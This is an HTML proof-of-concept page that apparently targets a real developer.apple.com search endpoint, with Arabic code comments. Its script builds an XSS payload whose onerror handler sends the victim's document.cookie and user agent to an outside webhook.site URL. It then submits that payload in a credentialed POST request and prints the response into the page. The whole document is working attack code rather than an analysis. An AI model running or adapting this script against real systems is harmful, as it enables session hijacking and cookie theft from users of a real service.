<body>
  <h2>Apple Developer Client-Side Desync PoC</h2>
  <p>This page demonstrates a crafted request and CSP bypass attempt.</p>

  <script>
    // Webhook الخاص بك
    const webhook = "https://webhook.site/76de3122-9fc0-47d9-844c-1fb847ba7133";

    // Payload بسيط مع onerror
    const payload = "<img src=x onerror=\"fetch('" + webhook + "?cookie='+document.cookie+'&ua='+navigator.userAgent)\">";

    // إرسال الطلب المصمم للـ endpoint
    fetch("https://developer.apple.com/search/services/v1/quick-links/", {
      method: "POST",
      headers: {"Content-Type": "application/x-www-form-urlencoded"},
      body: "payload=" + encodeURIComponent(payload),
      credentials: "include"
    })
    .then(res => res.text())
    .then(text => {
      console.log("Response snippet:", text.slice(0,200));
      document.body.innerHTML += "<pre>Response snippet:\n" + text.slice(0,200) + "</pre>";
    })
    .catch(err => console.error("PoC Error:", err));
  </script>
